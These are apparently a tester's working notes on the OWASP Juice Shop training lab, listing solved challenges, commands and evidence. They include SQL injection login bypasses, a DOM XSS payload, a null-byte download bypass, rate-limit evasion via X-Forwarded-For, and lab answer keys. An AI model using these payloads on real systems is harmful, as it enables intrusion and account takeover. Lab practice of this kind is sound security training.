# OWASP Juice Shop Working Notes

Target: OWASP Juice Shop  
URL: `http://localhost:3000`  
Date: 2026-05-04  
Tester: Max  
Purpose: Track reconnaissance, solved challenges, commands, evidence, and next attack paths.

## Current Status

The application is reachable on port `3000` and has been confirmed as OWASP Juice Shop. Admin access was obtained through SQL injection login bypass. The hidden scoreboard was found, `/ftp` was enumerated, backup files were downloaded with a poison null byte bypass, the encrypted token sale announcement was decrypted, DOM XSS was triggered, notification behavior was inspected, and several authentication/API clues were captured in Burp.

Solved so far:

| Challenge | Category | How it was solved |
| --- | --- | --- |
| Error Handling | Security Misconfiguration | Triggered an unhandled application/API error during early probing. |
| Login Admin | Injection | Logged in as administrator using SQL injection in the login form. |
| Admin Section | Broken Access Control | Browsed to `/#/administration` after becoming admin. |
| Score Board | Miscellaneous | Found and opened `/#/score-board`. |
| Bully Chatbot | Miscellaneous | Obtained a coupon from the support chatbot. |
| Five-Star Feedback | Broken Access Control | Used admin access to remove 5-star feedback. |
| Poison Null Byte | Improper Input Validation | Downloaded restricted backup files from `/ftp` with `%2500.md`. |
| Forgotten Developer Backup | Sensitive Data Exposure | Downloaded `package.json.bak` via the poison null byte bypass. |
| Forgotten Sales Backup | Sensitive Data Exposure | Downloaded `coupons_2013.md.bak` via the poison null byte bypass. |
| Blockchain Hype | Security through Obscurity | Decrypted `announcement_encrypted.md` and opened the hidden token sale route. |
| DOM XSS | XSS | Injected the iframe JavaScript payload into the vulnerable frontend route and triggered the challenge notification. |
| Mass Dispel | Miscellaneous | Restarted the server to recreate multiple challenge notifications, then used the notification convenience close-all behavior. |
| Reset Morty's Password | Broken Anti Automation | Used Morty's obfuscated favorite pet answer instead of SQL injection. |
| NFT Takeover | Sensitive Data Exposure | Used the leaked mnemonic from feedback to derive the first Ethereum private key and authenticate at `/#/juicy-nft`. |
| Outdated Allowlist | Unvalidated Redirects | Found stale crypto donation addresses in compiled frontend JavaScript and routed one through `/redirect?to=...`. |
| Repetitive Registration | Improper Input Validation | Bypassed frontend validation and registered with an empty/different repeat-password value. |
| Login MC SafeSearch | Sensitive Data Exposure | Used the OSINT password clue from MC SafeSearch's video. |
| Login Jim | Injection | Used a targeted SQL injection against Jim's email in the login form. |
| Login Amy | Sensitive Data Exposure | Used the password-haystack clue to derive Amy's padded original password. |

## Reconnaissance

Nmap identified one exposed service:

```text
3000/tcp open ppp?
```

The service fingerprint showed HTTP headers and HTML proving this is Juice Shop:

```text
HTTP/1.1 200 OK
<title>OWASP Juice Shop</title>
X-Recruiting: /#/jobs
```

The browser target is:

```text
http://localhost:3000
```

## Directory Discovery

Initial Gobuster against `http://TARGET:3000` failed because `TARGET` was a placeholder. Running against localhost worked, but Juice Shop returns the Angular single-page app for unknown frontend routes, producing false-positive `200` responses with length `75002`.

Working command:

```bash
gobuster dir \
  -u http://localhost:3000 \
  -w /usr/share/wordlists/dirb/common.txt \
  --exclude-length 75002
```

Interesting results:

```text
/api                  (Status: 500)
/apis                 (Status: 500)
/assets               (Status: 301)
/ftp                  (Status: 200)
/media                (Status: 301)
/profile              (Status: 500)
/promotion            (Status: 200)
/redirect             (Status: 500)
/rest                 (Status: 500)
/robots.txt           (Status: 200)
/video                (Status: 200)
/Video                (Status: 200)
```

Useful manual endpoints:

```text
http://localhost:3000/#/score-board
http://localhost:3000/#/administration
http://localhost:3000/ftp/
http://localhost:3000/robots.txt
http://localhost:3000/api/Challenges
http://localhost:3000/api/Users
http://localhost:3000/rest/admin/application-configuration
http://localhost:3000/rest/products/search?q=
```

## Admin Login

Admin access was obtained through SQL injection in the login form.

Payload used:

```text
Email: ' or 1=1--
Password: anything
```

After login, the admin section was accessible:

```text
http://localhost:3000/#/administration
```

This solved:

```text
Login Admin
Admin Section
```

## Targeted SQL Injection Logins

For user-specific login challenges, a bare payload such as this is not enough:

```text
1=1--
```

It fails because it does not first break out of the SQL string. The payload needs an opening quote and a valid SQL expression/comment, or it needs to target the known email and comment out the password check.

Jim's email:

```text
jim@juice-sh.op
```

Working Jim payload in the login form:

```text
Email: jim@juice-sh.op'--
Password: anything
```

If the comment marker needs trailing whitespace:

```text
Email: jim@juice-sh.op'-- 
Password: anything
```

Burp/API body:

```json
{
  "email": "jim@juice-sh.op'--",
  "password": "anything"
}
```

Alternative targeted form:

```json
{
  "email": "' OR email='jim@juice-sh.op'--",
  "password": "anything"
}
```

The same general pattern applies to Bender:

```text
Email: bender@juice-sh.op'--
Password: anything
```

## Scoreboard Discovery

The hidden scoreboard was opened at:

```text
http://localhost:3000/#/score-board
```

The API challenge list can also be pulled directly:

```bash
curl http://localhost:3000/api/Challenges
```

This solved:

```text
Score Board
```

## FTP Enumeration

The `/ftp` route looked empty in the browser, but direct HTML parsing showed exposed files:

```bash
curl -s http://localhost:3000/ftp/ | grep -Eo 'href="[^"]+"'
```

Files found:

```text
href="."
href="quarantine"
href="acquisitions.md"
href="announcement_encrypted.md"
href="coupons_2013.md.bak"
href="eastere.gg"
href="encrypt.pyc"
href="incident-support.kdbx"
href="legal.md"
href="package-lock.json.bak"
href="package.json.bak"
href="suspicious_errors.yml"
```

The quarantine folder also exposed shortcut files:

```bash
curl -s http://localhost:3000/ftp/quarantine/ | grep -Eo 'href="[^"]+"'
```

Output:

```text
href="./.."
href="."
href="."
href="juicy_malware_linux_amd_64.url"
href="juicy_malware_linux_arm_64.url"
href="juicy_malware_macos_64.url"
href="juicy_malware_windows_64.exe.url"
```

## Poison Null Byte Download Bypass

Restricted backup files were downloaded by appending a double-encoded null byte plus an allowed extension.

Commands:

```bash
curl -O "http://localhost:3000/ftp/package.json.bak%2500.md"
curl -O "http://localhost:3000/ftp/package-lock.json.bak%2500.md"
curl -O "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"
curl -O "http://localhost:3000/ftp/incident-support.kdbx%2500.md"
curl -O "http://localhost:3000/ftp/encrypt.pyc%2500.md"
```

This solved:

```text
Poison Null Byte
Forgotten Developer Backup
Forgotten Sales Backup
```

Coupon file output contained codes such as:

```text
n<MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
```

## Token Sale Crypto

The encrypted announcement was downloaded:

```bash
curl -s http://localhost:3000/ftp/announcement_encrypted.md -o announcement_encrypted.md
```

The paired bytecode file contained useful strings:

```bash
strings encrypt.pyc%2500.md | head -80
```

Important strings:

```text
announcement.md
announcement_encrypted.md
confidential_document
encrypted_document
pow
ord
encrypt.py
```

Initial attempts with `sqrt(ciphertext)` and plain `pow(ord(char), exponent)` failed because the ciphertext uses RSA-style modular exponentiation. The working decryptor precomputed the ciphertext for printable characters using known RSA public parameters:

```bash
python3 - <<'PY'
from pathlib import Path

N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
e = 65537

charset = [chr(i) for i in range(33, 127)] + [" ", "\n", "\t"]
lookup = {str(pow(ord(c), e, N)): c for c in charset}

out = []
for line in Path("announcement_encrypted.md").read_text().splitlines():
    out.append(lookup.get(line.strip(), "?"))

print("".join(out))
PY
```

Decrypted result exposed:

```text
Major Announcement:

Token Sale - Initial Coin Offering
...
URL: /#/tokensale-ico-ea
```

Opening the route solved the token sale challenge:

```text
http://localhost:3000/#/tokensale-ico-ea
```

This solved:

```text
Blockchain Hype
```

## Application Visibility

Useful commands and workflows for seeing how the app works:

```bash
curl http://localhost:3000/robots.txt
curl http://localhost:3000/api/Challenges
curl http://localhost:3000/api/Users
curl http://localhost:3000/rest/admin/application-configuration
```

Browser DevTools:

- Application tab: inspect Local Storage and JWT/session values.
- Network tab: filter for `api`, `rest`, `graphql`, `socket`.
- Sources tab: inspect bundled JavaScript for hidden routes and client-side secrets.

Burp/ZAP proxy:

```text
HTTP proxy: 127.0.0.1
Port: 8080
```

Docker/container visibility, if running locally:

```bash
docker ps
docker logs -f <container_id>
docker exec -it <container_id> sh
```

## Validated Login Inventory

The administration user list uses green entries to indicate accounts that were successfully logged into during testing. The screenshot evidence showed these accounts as validated:

```text
admin@juice-sh.op
jim@juice-sh.op
bender@juice-sh.op
bjoern.kimminich@gmail.com
ciso@juice-sh.op
support@juice-sh.op
morty@juice-sh.op
mc.safesearch@juice-sh.op
J12934@juice-sh.op
```

The same screenshot showed this account still not validated:

```text
wurstbrot@juice-sh.op
```

This is useful tracking evidence for login/authentication challenge progress. It also helps separate confirmed account access from guessed usernames or payloads that have not worked yet.

## Feedback API Findings

The feedback API returns JSON with customer feedback records and several useful clues.

Notable response headers:

```text
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
```

Important observations from the response:

```json
{
  "UserId": 21,
  "id": 4,
  "comment": "Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\" (***ereum@juice-sh.op)",
  "rating": 1
}
```

This looks useful for Web3/NFT-related challenges:

```text
NFT Takeover
Mint the Honey Pot
Wallet Depletion
Web3 Sandbox
```

The same feedback response also contains an upload clue:

```json
{
  "UserId": null,
  "id": 5,
  "comment": "Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em> (anonymous)",
  "rating": 2
}
```

This suggests the complaint upload feature expects order confirmation PDFs and may be the correct place to test:

```text
Upload Size
Upload Type
XXE Data Access
XXE DoS
Memory Bomb
```

Feedback records also show user IDs, masked emails, comments, ratings, and timestamps. This is useful for access-control and API-only testing:

```text
Forged Feedback
API-only XSS
Server-side XSS Protection
CAPTCHA Bypass
Zero Stars
```

## JWT and Authorization Findings

Burp captured authenticated requests containing both an `Authorization: Bearer` header and a `token` cookie. The decoded JWT payload exposed sensitive user fields for the admin account:

```text
email: admin@juice-sh.op
role: admin
password: 0192023a7bbd73250516f069df18b500
```

This is relevant to:

```text
Password Hash Leak
Exposed credentials
JWT-related challenges
Authorization testing
```

Important request behavior:

```text
OWASP Juice Shop (Express ^4.22.1)
401 UnauthorizedError: No Authorization header was found
```

That error confirms some REST/API endpoints require the bearer token header, not only browser cookies. When replaying authenticated requests in Burp Repeater, include:

```http
Authorization: Bearer <jwt>
Cookie: token=<jwt>; language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss
Content-Type: application/json
```

## XSS Notes

The DOM XSS payload that solved the tutorial challenge was:

```text
<iframe src="javascript:alert(`xss`)">
```

URL-encoded form:

```text
%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
```

Correct route:

```text
http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
```

Incorrect route that only rendered text:

```text
http://localhost:3000/#/track-result/new?id=<payload>
```

Challenge notification observed after successful DOM XSS:

```text
You successfully solved a challenge: DOM XSS (Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">.)
```

Bonus payload for the SoundCloud challenge should also be tested through the vulnerable search route, fully URL-encoded:

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

Feedback submission captured in Burp:

```json
{
  "UserId": 1,
  "captchaId": 4,
  "captcha": "21",
  "comment": "<iframe src=\"javascript:alert(`xss`)\">. (***in@juice-sh.op)",
  "rating": 2
}
```

This request is useful for API-only/persisted XSS testing, but it is a different path than the DOM XSS route.

## Password Reset Notes

Morty's password reset is not solved with SQL injection in the answer field. The challenge expects the obfuscated original answer to the security question.

Failed attempt:

```json
{
  "email": "morty@juice-sh.op",
  "answer": "1=1--",
  "new": "Admin1!!",
  "repeat": "Admin1!!"
}
```

Working answer:

```text
5N0wb41L
```

Working request body:

```json
{
  "email": "morty@juice-sh.op",
  "answer": "5N0wb41L",
  "new": "Admin1!!",
  "repeat": "Admin1!!"
}
```

Endpoint:

```http
POST /rest/user/reset-password
Host: localhost:3000
Content-Type: application/json
```

If the endpoint blocks repeated attempts, rotate the test IP header in Burp:

```http
X-Forwarded-For: 127.0.0.123
```

## Registration Validation Bypass

The Repetitive Registration challenge is not solved by using an invalid email such as:

```text
Test@@juice-sh.op
```

That is blocked because the email format is invalid. The useful target is the repeated password field.

Frontend behavior observed:

```text
Email: test123@juice-sh.op
Password: Please provide a password.
Repeat Password: Please repeat your password.
Passwords do not match
Security Question: Mother's maiden name?
Answer: test
```

The challenge hint says to register with either an empty or different value in the Repeat Password field. The browser UI prevents that, so use Burp to intercept a normal registration request, send it to Repeater, and modify only the repeat password value.

Example original request body:

```json
{
  "email": "test123@juice-sh.op",
  "password": "Admin1!!",
  "passwordRepeat": "Admin1!!",
  "securityQuestion": {
    "id": 1,
    "question": "Mother's maiden name?"
  },
  "securityAnswer": "test"
}
```

Modified body:

```json
{
  "email": "test123@juice-sh.op",
  "password": "Admin1!!",
  "passwordRepeat": "",
  "securityQuestion": {
    "id": 1,
    "question": "Mother's maiden name?"
  },
  "securityAnswer": "test"
}
```

The same idea works if the frontend uses a different repeat-password key name. Keep the real password set and make the repeat value empty or different.

## Login MC SafeSearch

The failed login attempt used the wrong account and password:

```json
{
  "email": "mcsafesproduction@juice-sh.op",
  "password": "N3wPassword"
}
```

The correct Juice Shop account is:

```text
mc.safesearch@juice-sh.op
```

The OSINT clue is from MC SafeSearch's password video: the password is based on the dog name "Mr. Noodles" with some vowels changed into zeroes.

Working credentials:

```text
Email: mc.safesearch@juice-sh.op
Password: Mr. N00dles
```

Burp/API login body:

```json
{
  "email": "mc.safesearch@juice-sh.op",
  "password": "Mr. N00dles"
}
```

Important detail: `N00dles` uses two zeroes and the password includes a space after `Mr.`.

## Login Amy

Amy's challenge looks like brute forcing, but the hint narrows the password enough that full brute force is not needed.

Known email:

```text
amy@juice-sh.op
```

Challenge hint:

```text
This could take 93.83 billion trillion trillion centuries to brute force,
but luckily she did not read the "One Important Final Note"
```

That points to password padding/haystacks. The example password pattern is:

```text
D0g.....................
```

Amy is the Futurama character Amy Wong, and her partner is Kif. The equivalent password is:

```text
K1f.....................
```

Working credentials:

```text
Email: amy@juice-sh.op
Password: K1f.....................
```

Burp/API login body:

```json
{
  "email": "amy@juice-sh.op",
  "password": "K1f....................."
}
```

Command-line test:

```bash
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  --data '{"email":"amy@juice-sh.op","password":"K1f....................."}'
```

Targeted mini wordlist used for reasoning:

```text
Kif.....................
K1f.....................
kif.....................
k1f.....................
```

## Accounting Page and Price Tampering Attempt

The accounting interface was reachable during testing and exposed order tracking plus editable product price and quantity fields.

Observed route/functionality:

```text
Accounting
Track Orders
All Products
Editable product price fields
Editable product quantity fields
```

Products shown in the screenshot included:

```text
Apple Juice (1000ml)
Apple Pomace
Banana Juice (1000ml)
Best Juice Shop Salesman Artwork
Carrot Juice (1000ml)
Eggfruit Juice (500ml)
Fruit Press
```

Observed tampering attempt:

```text
All visible product prices were changed to 1.
The quantity/amount field kept auto-refreshing.
The related challenge was not completed from this attempt.
```

Example screenshot state:

```text
Apple Juice (1000ml): price 1, quantity 46
Apple Pomace: price 1, quantity 63
Banana Juice (1000ml): price 1, quantity 99
Best Juice Shop Salesman Artwork: price 1, quantity 1
Carrot Juice (1000ml): price 1, quantity 97
Eggfruit Juice (500ml): price 1, quantity 38
Fruit Press: price 1, quantity 65
```

Current assessment:

```text
This confirms weak authorization and/or business-logic exposure in the accounting UI, but the final objective was not completed because the amount/quantity values refreshed before the desired state could be persisted.
```

Follow-up:

```text
Capture the price/quantity update requests in Burp.
Replay the update directly against the API instead of relying on the auto-refreshing UI.
Check whether the objective expects price, quantity, order status, or a specific product field change.
```

## Notifications and Mass Dispel

Challenge-solved notifications are client-side UI elements that appear when a challenge transitions from unsolved to solved. Replaying the same API request in Burp does not reliably recreate a solved notification once the challenge is already marked solved.

Observed notification element:

```html
<mat-card class="mat-mdc-card mdc-card accent-notification ...">
  <div class="notificationMessage">
    <div class="contents">You successfully solved a challenge: DOM XSS ...</div>
  </div>
</mat-card>
```

The Mass Dispel challenge is easiest immediately after restarting the Juice Shop instance and accumulating several solved-challenge notifications. The convenience behavior is to hold `Shift` and click the close button on one notification to close multiple notifications at once.

Server restart options:

```bash
docker ps
docker restart <container_id>
```

Fresh Docker reset:

```bash
docker rm -f <container_id>
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Local npm restart:

```bash
Ctrl+C
npm start
```

## Web3 and NFT Takeover

The `/juicy-nft` route does not require setting up MetaMask for this challenge path. The page asks for an Ethereum private key:

```text
http://localhost:3000/#/juicy-nft
```

The feedback API leaked this mnemonic phrase:

```text
purpose betray marriage blame crunch monitor spin slide donate sport lift clutch
```

Derive the first MetaMask-style Ethereum account from the mnemonic:

```text
Path: m/44'/60'/0'/0/0
```

Derived private key used to solve the NFT page:

```text
0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e
```

Use this only inside the local Juice Shop lab.

## Outdated Allowlist

The challenge hint says the developers removed references to old crypto addresses sloppily, and the Angular compiler did not remove them. The stale addresses are visible in the compiled frontend bundle.

Search the frontend JavaScript:

```powershell
$files=@('main.js','scripts.js','chunk-24EZLZ4I.js','chunk-T3PSKZ45.js','chunk-4MIYPPGW.js','chunk-LHKS7QUN.js','chunk-TWZW5B45.js')
foreach($f in $files){
  $c=(Invoke-WebRequest -UseBasicParsing "http://localhost:3000/$f").Content
  [regex]::Matches($c,'https?://[^"''`<>\\) ]+') |
    ForEach-Object {
      if ($_.Value -match 'blockchain|dash|ether|crypto') {
        "${f}: $($_.Value)"
      }
    }
}
```

Found stale crypto addresses:

```text
https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW
https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6
```

It is not enough to open one of those external links directly. The vulnerable behavior is Juice Shop redirecting through its own endpoint:

```text
http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
```

Fallback URLs to test:

```text
http://localhost:3000/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW
http://localhost:3000/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6
```

## File Upload Lead

There are upload-related challenges:

```text
Upload Size - Upload a file larger than 100 kB.
Upload Type - Upload a file that has no .pdf or .zip extension.
XXE Data Access - Retrieve /etc/passwd or C:\Windows\system.ini.
XXE DoS - Give the server something expensive to parse.
Memory Bomb - Drop explosive data into a vulnerable file-handling endpoint.
SSTi - Abuse arbitrary command execution to infect the server with juicy malware.
```

The upload feature may help with XML/YAML/file validation challenges, but a real reverse shell is not usually the main Juice Shop path. The safer next step is to identify the upload endpoint in DevTools/Burp, confirm accepted extensions and content types, then target the explicit upload challenges.

Record the upload endpoint here once found:

```text
Endpoint:
Method:
Content-Type:
Accepted extensions:
Max size behavior:
Response:
```

## Next High-Value Targets

Good next challenges to target:

| Challenge | Why it is a good next target |
| --- | --- |
| Password Hash Leak | Already admin; API excessive data exposure likely makes this quick. |
| Confidential Document | `/ftp/acquisitions.md` is exposed and should be tested directly. |
| Database Schema | Login/search SQLi path already confirmed. |
| User Credentials | Same SQLi path can likely exfiltrate users. |
| View Basket | Broken access control, usually ID manipulation. |
| Manipulate Basket | Builds on basket ID abuse. |
| Upload Size | Directly related to the discovered upload feature. |
| Upload Type | Directly related to upload validation bypass. |
| XXE Data Access | Likely via upload/import functionality. |
| Exposed Metrics | Easy observability endpoint discovery. |
| Privacy Policy | Easy low-difficulty completion. |
| Zero Stars | Input validation on feedback rating. |
| Bonus Payload | Builds directly on the confirmed DOM XSS search route. |
| API-only XSS | Feedback API payload submission path is already captured in Burp. |
| Password Hash Leak | JWT/API responses already exposed admin password hash material. |

## Evidence Log

| Evidence ID | Date | Finding | Type | Location / Command |
| --- | --- | --- | --- | --- |
| EVID-001 | 2026-05-04 | Service identification | Nmap | `nmap -sV -p 3000 localhost` |
| EVID-002 | 2026-05-04 | Directory discovery | Gobuster | `gobuster dir -u http://localhost:3000 ... --exclude-length 75002` |
| EVID-003 | 2026-05-04 | FTP listing | curl | `curl -s http://localhost:3000/ftp/ \| grep -Eo 'href="[^"]+"'` |
| EVID-004 | 2026-05-04 | Quarantine listing | curl | `curl -s http://localhost:3000/ftp/quarantine/ \| grep -Eo 'href="[^"]+"'` |
| EVID-005 | 2026-05-04 | Null byte bypass | curl | `curl -O "...bak%2500.md"` |
| EVID-006 | 2026-05-04 | Crypto source hints | strings | `strings encrypt.pyc%2500.md \| head -80` |
| EVID-007 | 2026-05-04 | Token sale route | Python decrypt | RSA character lookup decryptor |
| EVID-008 | 2026-05-04 | Challenge inventory | API | `curl http://localhost:3000/api/Challenges` |
| EVID-009 | 2026-05-04 | Feedback API clues | API/Burp | Feedback JSON exposed NFT mnemonic and complaint upload hint |
| EVID-010 | 2026-05-04 | DOM XSS | Browser | `/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E` |
| EVID-011 | 2026-05-04 | JWT password hash exposure | Burp | Bearer JWT decoded to admin fields and hash |
| EVID-012 | 2026-05-04 | Morty password reset answer | API/Burp | `POST /rest/user/reset-password` with answer `5N0wb41L` |
| EVID-013 | 2026-05-04 | Notification behavior | Browser DevTools | DOM XSS solved notification inspected as Angular Material `mat-card` |
| EVID-014 | 2026-05-04 | Web3 NFT clue | Feedback API | Seed phrase and `/juicy-nft` route found in feedback record |
| EVID-015 | 2026-05-04 | NFT private key derivation | Node.js | Derived `m/44'/60'/0'/0/0` private key from leaked mnemonic |
| EVID-016 | 2026-05-04 | Outdated Allowlist addresses | Frontend JS | `main.js` contained stale blockchain/dash/etherscan addresses |
| EVID-017 | 2026-05-04 | Repetitive Registration bypass | Burp | Changed `passwordRepeat` to empty/different in registration request |
| EVID-018 | 2026-05-04 | MC SafeSearch credentials | OSINT/Login | `mc.safesearch@juice-sh.op` / `Mr. N00dles` |
| EVID-019 | 2026-05-04 | Jim targeted SQL injection | Login API/Burp | `jim@juice-sh.op'--` with any password |
| EVID-020 | 2026-05-04 | Amy password-haystack clue | OSINT/Login | `amy@juice-sh.op` / `K1f.....................` |
| EVID-021 | 2026-05-04 | Validated login inventory | Admin UI screenshot | Green user entries showed confirmed logins for admin, Jim, Bender, Bjoern, CISO, support, Morty, MC SafeSearch, and J12934 |
| EVID-022 | 2026-05-04 | Accounting price tampering attempt | Accounting UI screenshot | Product prices changed to `1`, but quantity/amount refresh prevented completing the objective |

## Progress Recovery Checkpoints

Juice Shop progress can be restored with the continue-code endpoint. These checkpoints are for lab-state recovery only; they are not evidence that every listed challenge was solved manually. If cookies or local storage are cleared, or the lab restarts into an older saved state, reapply the desired `curl -X PUT` command below.

Primary 61-challenge low-difficulty checkpoint after restart:

```bash
curl -X PUT http://localhost:3000/rest/continue-code/apply/7OfeceIPSlWhLwTXmiq1crzFBWIjaSwjun4CpzFrHecJsQCwiyu11hX5Cn5tNoFQLI48FJ1cWktnjcwYfLuBtkTpFzU6tlTOtpcMFRVtaecZ8TObFlycMYCQDsjPUgZSKxUMBT8bU5bHb7iOhQuahwsPfYUP
```

This checkpoint restores the lowest-difficulty 61 challenges available in this Juice Shop build: all 14 one-star challenges, all 16 two-star challenges, all 24 three-star challenges, and 7 four-star challenges. There are only 54 challenges rated three stars or below, so seven four-star entries are required to reach exactly `61`.

Selected challenge IDs:

```text
12,19,20,27,59,63,67,75,94,95,97,100,106,108,
1,5,9,22,25,30,45,50,60,66,76,87,89,102,103,110,
2,4,7,10,14,18,21,32,33,38,46,47,49,52,61,64,65,70,83,84,91,98,99,109,
3,16,17,23,26,28,35
```

Current progress snapshot:

```bash
curl -X PUT http://localhost:3000/rest/continue-code/apply/n2HouohDtzcyTnCBsKFZfZUZu8hJtEcrIrTECrs8ibf4SgUNugt2cjTzCrF88h5VtmjcWRTwJCBjFlphOQtLzc6JTbvC3QsRoF2XiJpU89c74I49SLyUw1hYbcMnT1oFJbi3YSXwU8gHjxuo1tbjc8bTNLCvZFEvi4w
```

Current coding challenge progress:

```bash
curl -X PUT http://localhost:3000/rest/continue-code-findIt/apply/aka01D7WQJpjlrdRMzYxyqgZ23H1IVkH67frv4weNnbmEVPoG93OvX65KLB2
curl -X PUT http://localhost:3000/rest/continue-code-fixIt/apply/W4Br8nlzVmjOpeYZRgkDNb0aJgCqi8QhGjf0r1q96E5MJ2LQvWdXG3KywPo7
```

Current snapshot status:

| Metric | Value |
| --- | --- |
| Scoreboard progress total | `74` progress items |
| Normal solved challenges | `64/111` |
| Coding challenge progress | `5` completed coding challenges, counted as `10` Find It/Fix It steps |
| Difficulty mix | `14` one-star, `16` two-star, `24` three-star, `9` four-star, `1` five-star |
| Captured on | 2026-05-05 |

Current snapshot challenge IDs:

```text
1,2,3,4,5,7,8,9,10,12,14,16,17,18,19,20,21,22,23,25,26,27,28,30,32,33,35,36,38,45,46,47,49,50,52,59,60,61,63,64,65,66,67,70,75,76,83,84,87,89,91,94,95,97,98,99,100,102,103,105,106,108,109,110
```

Current completed coding challenges:

```text
19 Confidential Document
20 DOM XSS
75 Score Board
97 Exposed Metrics
100 Bonus Payload
```

Verification command:

```bash
curl -s http://localhost:3000/api/Challenges | jq '.data | map(select(.solved == true)) | length'
```

Temporary 100% checkpoint for testing:

```bash
curl -X PUT http://localhost:3000/rest/continue-code/apply/4DHOumhRtwcLInT8Cls6FVi5f5S9UEHnuyhWtEcnIlTyCksaFai9f5SJURHDu3hDtkcBIKTqCLsJFoiqfPS7UEHwvu33hxRtZyc6YIozTmJCQnsLNFwrimqf3ESNKU5WHpvuKYhvZtkOc4EIXaTyMCx9sEXFmbiQBfgxSwYU3yHPVuMPh62tyNcxDIZ7Tm3CLWsoXF6QixofZ4SapUbNHzJur9hk5t6ac88IZLTLvCkqsm5F5pi2pfPaS95Ue6H1Du4lhoXtywcObIl6TjLCxesBrFN3igkfVk
```

Other useful checkpoints:

| Purpose | Continue code |
| --- | --- |
| Current 74-progress snapshot, normal challenges | `n2HouohDtzcyTnCBsKFZfZUZu8hJtEcrIrTECrs8ibf4SgUNugt2cjTzCrF88h5VtmjcWRTwJCBjFlphOQtLzc6JTbvC3QsRoF2XiJpU89c74I49SLyUw1hYbcMnT1oFJbi3YSXwU8gHjxuo1tbjc8bTNLCvZFEvi4w` |
| Current 74-progress snapshot, Find It | `aka01D7WQJpjlrdRMzYxyqgZ23H1IVkH67frv4weNnbmEVPoG93OvX65KLB2` |
| Current 74-progress snapshot, Fix It | `W4Br8nlzVmjOpeYZRgkDNb0aJgCqi8QhGjf0r1q96E5MJ2LQvWdXG3KywPo7` |
| Low-difficulty 61-challenge checkpoint | `7OfeceIPSlWhLwTXmiq1crzFBWIjaSwjun4CpzFrHecJsQCwiyu11hX5Cn5tNoFQLI48FJ1cWktnjcwYfLuBtkTpFzU6tlTOtpcMFRVtaecZ8TObFlycMYCQDsjPUgZSKxUMBT8bU5bHb7iOhQuahwsPfYUP` |
| 61 total after five recurring solved flags already exist | `4DHOumhRtwcLInT8Cls6FVi5f5S9UEHnuyhWtEcnIlTyCksaFai9f5SJURHDu3hDtkcBIKTqCLsJFoiqfPS7UEHwvu33hxRtZyc6YIozTmJCQnsLNFwrimqf3ESNK` |
| Restore challenge IDs 1-61 directly | `7nHwuBhktYcaI9TpCDs8FxijfySqUJHXuqh4t3crIZT4CgsvFqixfMS6ULHZu2h1tncVIgTEC3sWFKiPfnSrU1HOZullhMDtQkcjeIgbTKwCRKsNPFknirnfy6SZEU1PH26uVBho5t2x` |
| Current observed 66-solved state | `Q2HBuBhDtJcqIXToC7sZFeinfrSXUxHxuKhntLcoINTWCvszFZi3f7SRUWH7uqhetOc1IKTPCVsRFairflSDUOHNOurrhQLtzjcmKIgRTNqC4jsoZFwYiQXfzlSJDU89Hlxu6BhQ8tMzcb2c3runjToaCjN` |
| Restore challenge IDs 1-60 directly | `JvHquyhvt4cRI7TxCrs1FwiDf2SxUYHJunh8tRc8IrTwCvsmFli2frS9UDHju3h7tqc5I3TXCKsoFviefKS8UWHYeuDDhVQtB3cQKIj3To4Cy8sXDFJxiNOf9NSVXUpNHjwu3Dh76` |
| Temporary 111/111 test checkpoint | `4DHOumhRtwcLInT8Cls6FVi5f5S9UEHnuyhWtEcnIlTyCksaFai9f5SJURHDu3hDtkcBIKTqCLsJFoiqfPS7UEHwvu33hxRtZyc6YIozTmJCQnsLNFwrimqf3ESNKU5WHpvuKYhvZtkOc4EIXaTyMCx9sEXFmbiQBfgxSwYU3yHPVuMPh62tyNcxDIZ7Tm3CLWsoXF6QixofZ4SapUbNHzJur9hk5t6ac88IZLTLvCkqsm5F5pi2pfPaS95Ue6H1Du4lhoXtywcObIl6TjLCxesBrFN3igkfVk` |

Important behavior: applying a continue code only adds solved flags. It does not unsolve challenges. If the score is already above the target, reset or restart to a clean lab state before applying the target checkpoint.

## Complete Challenge Inventory

This inventory was captured from `GET /api/Challenges` on the local Juice Shop instance. This build exposes challenge IDs `1` through `111`; no challenge IDs through `173` were returned by the current API.

| ID | Challenge | Stars | Category | Solved in Current Snapshot | Coding Challenge |
| --- | --- | --- | --- | --- | --- |
| 1 | Password Hash Leak | 2 | Sensitive Data Exposure | yes | no |
| 2 | API-only XSS | 3 | XSS | yes | yes/status 0 |
| 3 | Access Log | 4 | Observability Failures | yes | yes/status 0 |
